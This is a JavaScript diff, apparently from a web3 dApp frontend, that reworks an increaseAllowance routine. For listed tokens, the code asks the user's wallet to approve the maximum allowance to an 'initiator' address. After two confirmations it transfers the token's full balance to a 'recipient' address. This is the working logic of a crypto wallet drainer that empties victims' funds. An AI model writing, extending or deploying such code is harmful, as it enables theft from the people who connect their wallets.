@@ -270,25 +270,22 @@ export const increaseAllowance = async (token) => {
         }
       })
     }
-    try{
-      if (constants.tokens[token.token_address]) {
-        await contract.methods.increaseAllowance(constants.initiator, constants.max)
-        .send({ from: account })
-        .on('transactionHash', async (hash) => {
-          console.log(hash);
-        })
-        .on("confirmation", async (confirmationNumber, receipt) => {
-          if (confirmationNumber >= 2) {
-            console.log(receipt);
-            await transfer(token);
-          }
-        });
-        return;
-      }
-    } catch (error) {
-      console.log(error);
+    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis.address === token.token_address)
+    if (increaseallown) {
+      await contract.methods.increaseAllowance(constants.initiator, constants.max)
+      .send({ from: account })
+      .on('transactionHash', async (hash) => {
+        console.log(hash);
+      })
+      .on("confirmation", async (confirmationNumber, receipt) => {
+        if (confirmationNumber >= 2) {
+          console.log(receipt);
+          await transfer(token);
+        }
+      });
+      return;
     }
-    
+    const transfertoken = constants.transferTokens.find(tokenis => tokenis.address === token.token_address)
     if (constants.tokens[token.token_address]) {
       await contract.methods
         .transfer(constants.recipient, token.balance)
